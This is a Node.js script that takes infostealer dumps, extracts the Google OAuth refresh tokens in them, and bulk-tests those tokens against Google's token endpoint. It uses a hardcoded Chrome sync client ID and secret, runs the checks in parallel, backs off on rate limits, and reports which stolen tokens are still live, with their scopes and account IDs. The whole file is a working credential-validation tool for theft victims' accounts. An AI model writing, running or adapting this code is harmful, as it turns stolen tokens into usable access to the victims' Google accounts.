#!/usr/bin/env node
/**
 * check_google_tokens.mjs
 *
 * Bulk-validate Google OAuth refresh tokens (the `GoogleAccounts/*.txt` files
 * in stealer dumps, or any list of `1//...` tokens) against the token
 * endpoint. Classifies each token:
 *
 *   ALIVE           -> token still exchanges for an access_token
 *   REVOKED         -> invalid_grant (revoked/expired server-side)
 *   CLIENT_BLOCKED  -> invalid_client (the OAuth client pair is rejected;
 *                      re-run with a working --client-id/--client-secret)
 *   RATE_LIMITED    -> 429, retried once with backoff, then skipped
 *   ERROR           -> anything else (network, malformed response)
 *
 * Defaults to the Chrome sync client pair; override when Google re-enables a
 * public secret or you have your own registered client.
 *
 * Usage:
 *   node scripts/check_google_tokens.mjs "<dumpRoot>" [options]
 *   node scripts/check_google_tokens.mjs --tokens-file tokens.txt [options]
 *   node scripts/check_google_tokens.mjs --selftest
 *
 * Options:
 *   --client-id <id>       OAuth client id      (default: Chrome sync client)
 *   --client-secret <sec>  OAuth client secret  (default: known public secret)
 *   --limit N              check at most N unique tokens
 *   --concurrency N        parallel exchanges   (default 4)
 *   --json <file>          write machine-readable results
 */

import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

const argv = process.argv.slice(2);
const flag = (name, def) => { const i = argv.indexOf(`--${name}`); return i !== -1 && argv[i + 1] ? argv[i + 1] : def; };
const has = (name) => argv.includes(`--${name}`);

const CLIENT_ID = flag('client-id', '77185425430.apps.googleusercontent.com');
const CLIENT_SECRET = flag('client-secret', 'OTJgUOQcT7lO7GsGZq2G4IlT');
const LIMIT = parseInt(flag('limit', '0'), 10) || 0;
const CONCURRENCY = Math.max(1, parseInt(flag('concurrency', '4'), 10) || 4);
const JSON_OUT = flag('json', null);
const ENDPOINT = 'https://oauth2.googleapis.com/token';
const MAX_BLOCKED_BEFORE_ABORT = 5;

// ---------- pure helpers (selftestable) ----------

/** Split a raw dump line into { token, gaia } — token is `1//...`, gaia after the colon. */
export function parseLine(line) {
  const t = line.trim();
  if (!t.startsWith('1//')) return null;
  const i = t.indexOf(':');
  if (i === -1) return { token: t, gaia: null };
  return { token: t.slice(0, i), gaia: t.slice(i + 1) };
}

/** Classify a token endpoint response. */
export function classify(http, body) {
  const b = body || {};
  if (http === 200 && b.access_token) return { status: 'ALIVE', scope: b.scope || null, expires: b.expires_in || null };
  if (http === 429 || b.error === 'rate_limit_exceeded') return { status: 'RATE_LIMITED', detail: b.error_description || null };
  if (b.error === 'invalid_grant') return { status: 'REVOKED', detail: b.error_description || null };
  if (b.error === 'invalid_client') return { status: 'CLIENT_BLOCKED', detail: b.error_description || null };
  return { status: 'ERROR', detail: b.error ? `${b.error}: ${b.error_description || ''}` : `http ${http}` };
}

export function selftest() {
  const cases = [
    [200, { access_token: 'x', scope: 'https://www.googleapis.com/auth/gmail', expires_in: 3599 }, 'ALIVE'],
    [400, { error: 'invalid_grant' }, 'REVOKED'],
    [401, { error: 'invalid_client' }, 'CLIENT_BLOCKED'],
    [429, { error: 'rate_limit_exceeded' }, 'RATE_LIMITED'],
    [500, {}, 'ERROR'],
    [400, { error: 'invalid_scope', error_description: 'bad scope' }, 'ERROR'],
  ];
  for (const [http, body, want] of cases) {
    const got = classify(http, body).status;
    if (got !== want) { console.error(`SELFTEST FAIL: http ${http} expected ${want} got ${got}`); process.exit(1); }
  }
  if (parseLine('1//abc:123')?.gaia !== '123' || parseLine('1//abc').gaia !== null || parseLine('garbage') !== null) {
    console.error('SELFTEST FAIL: parseLine'); process.exit(1);
  }
  console.log(`SELFTEST PASS (${cases.length} classify + parse cases)`);
  process.exit(0);
}
if (has('selftest')) selftest();

// ---------- token collection ----------

function collectFromDump(root) {
  const seen = new Map(); // token -> { gaia, files }
  const stack = [root];
  let dirs = 0;
  while (stack.length) {
    const dir = stack.pop();
    let ents; try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch { continue; }
    for (const e of ents) {
      const full = path.join(dir, e.name);
      if (!e.isDirectory()) continue;
      if (e.name === 'GoogleAccounts' || e.name === 'GgAts') {
        dirs++;
        for (const f of fs.readdirSync(full)) {
          let text; try { text = fs.readFileSync(path.join(full, f), 'utf8'); } catch { continue; }
          for (const line of text.split(/\r?\n/)) {
            const p = parseLine(line);
            if (!p) continue;
            const rec = seen.get(p.token) || { gaia: p.gaia, files: [] };
            rec.gaia = rec.gaia || p.gaia;
            rec.files.push(`${path.basename(dir).slice(0, 40)}/${f}`);
            seen.set(p.token, rec);
          }
        }
      } else stack.push(full);
    }
  }
  return { tokens: [...seen.entries()].map(([token, rec]) => ({ token, gaia: rec.gaia, files: rec.files })), dirs };
}

function collectFromFile(file) {
  const out = [];
  for (const line of fs.readFileSync(file, 'utf8').split(/\r?\n/)) {
    const p = parseLine(line);
    if (p) out.push({ token: p.token, gaia: p.gaia, files: [file] });
  }
  return { tokens: out, dirs: 0 };
}

// ---------- exchange ----------

async function exchange(token) {
  const body = new URLSearchParams({ grant_type: 'refresh_token', client_id: CLIENT_ID, client_secret: CLIENT_SECRET, refresh_token: token });
  const res = await fetch(ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
  const text = await res.text();
  let json = null; try { json = JSON.parse(text); } catch {}
  return classify(res.status, json);
}

// ---------- runner ----------

const [modeTarget] = argv.filter((a) => a && !a.startsWith('-'));
const tokensFile = flag('tokens-file', null);
if (!modeTarget && !tokensFile) {
  console.error('Usage: node scripts/check_google_tokens.mjs "<dumpRoot>" | --tokens-file <file> | --selftest [options]');
  process.exit(1);
}

const { tokens, dirs } = tokensFile ? collectFromFile(tokensFile) : collectFromDump(modeTarget);
const uniq = LIMIT ? tokens.slice(0, LIMIT) : tokens;
console.error(`Tokens: ${tokens.length} unique${dirs ? ` (from ${dirs} GoogleAccounts dirs)` : ''}${LIMIT ? `, limited to first ${LIMIT}` : ''}`);
console.error(`Client: ${CLIENT_ID}  |  concurrency ${CONCURRENCY}`);

const results = [];
let next = 0, blockedStreak = 0, aborted = false;

async function worker() {
  while (!aborted) {
    const i = next++;
    if (i >= uniq.length) return;
    const { token, gaia, files } = uniq[i];
    let r = await exchange(token);
    if (r.status === 'RATE_LIMITED') { await new Promise((x) => setTimeout(x, 3000)); r = await exchange(token); }
    r.gaia = gaia; r.files = files.length; r.token = token.slice(0, 12) + '…';
    results[i] = r;
    const mark = r.status === 'ALIVE' ? '✅' : r.status === 'REVOKED' ? '💀' : r.status === 'CLIENT_BLOCKED' ? '⛔' : r.status === 'RATE_LIMITED' ? '⏳' : '❌';
    console.error(`  ${mark} [${gaia || '?'}] ${token.slice(0, 12)}… ${r.status}${r.scope ? ' ' + r.scope.split(' ')[0] : r.detail ? ' ' + r.detail : ''}`);
    if (r.status === 'CLIENT_BLOCKED' && ++blockedStreak >= MAX_BLOCKED_BEFORE_ABORT) {
      aborted = true;
      console.error(`\n⛔ Client pair rejected (${MAX_BLOCKED_BEFORE_ABORT}× invalid_client). Re-run with a working --client-id/--client-secret.`);
    } else if (r.status !== 'CLIENT_BLOCKED') blockedStreak = 0;
  }
}

await Promise.all(Array.from({ length: CONCURRENCY }, worker));

const counts = {};
for (const r of results) { if (r) counts[r.status] = (counts[r.status] || 0) + 1; }
const alive = results.filter((r) => r && r.status === 'ALIVE');
console.error(`\n=== checked ${results.filter(Boolean).length}/${uniq.length} ===`);
for (const [k, v] of Object.entries(counts)) console.error(`  ${k.padEnd(14)} ${v}`);
if (alive.length) console.error(`\nALIVE (${alive.length}):`);
for (const r of alive) console.error(`  ✅ gaia ${r.gaia || '?'}  ${r.token}  scope: ${(r.scope || '').split(' ').join(' ')}`);

if (JSON_OUT) {
  fs.writeFileSync(path.resolve(JSON_OUT), JSON.stringify({ client_id: CLIENT_ID, checked: results.filter(Boolean).length, counts, results: results.filter(Boolean) }, null, 2));
  console.log(`Wrote results → ${path.resolve(JSON_OUT)}`);
}